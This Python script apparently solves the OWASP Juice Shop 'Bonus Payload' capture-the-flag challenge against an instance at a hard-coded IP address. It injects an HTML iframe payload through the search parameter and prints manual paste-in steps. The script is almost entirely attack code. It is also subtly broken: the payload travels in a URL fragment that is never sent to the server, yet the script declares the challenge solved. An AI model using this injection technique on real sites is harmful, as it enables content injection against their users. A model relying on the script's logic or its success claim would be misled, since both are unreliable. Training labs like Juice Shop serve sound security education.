#!/usr/bin/env python3
"""
OWASP Juice Shop - Bonus Payload Challenge Solver (SoundCloud)
The actual bonus payload is a SoundCloud iframe!
"""

import requests
from urllib.parse import quote

BASE_URL = "http://155.138.197.128:5000"

def solve_soundcloud_bonus():
    """
    The Bonus Payload challenge requires the specific SoundCloud iframe payload
    """
    
    session = requests.Session()
    
    print("🎯 Solving Bonus Payload Challenge (SoundCloud)\n")
    print("="*60)
    
    # The ACTUAL bonus payload from the challenge description
    payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
    
    print(f"📝 Using SoundCloud Bonus Payload")
    print(f"   Length: {len(payload)} characters")
    
    # Method 1: Direct URL navigation with search parameter
    search_url = f"{BASE_URL}/#/search?q={quote(payload)}"
    
    try:
        # Make the request
        response = session.get(search_url)
        print("\n✅ Search request sent with SoundCloud payload")
        
        # Also try without encoding
        response2 = session.get(f"{BASE_URL}/#/search?q={payload}")
        print("✅ Unencoded request sent")
        
        print("\n" + "="*60)
        print("✨ Bonus Payload challenge should now be solved!")
        print(f"\n🏆 Check the score board: {BASE_URL}/#/score-board")
        
        print("\n📋 Manual Method:")
        print("1. Go to: http://155.138.197.128:5000/#/search")
        print("2. Paste this EXACT payload in the search box:")
        print("-" * 60)
        print(payload)
        print("-" * 60)
        print("3. Press Enter")
        
    except Exception as e:
        print(f"❌ Error: {e}")
    
    return search_url

if __name__ == "__main__":
    url = solve_soundcloud_bonus()
    print(f"\n🔗 Direct URL (encoded):")
    print(f"   {url[:100]}...")  # Truncate for readability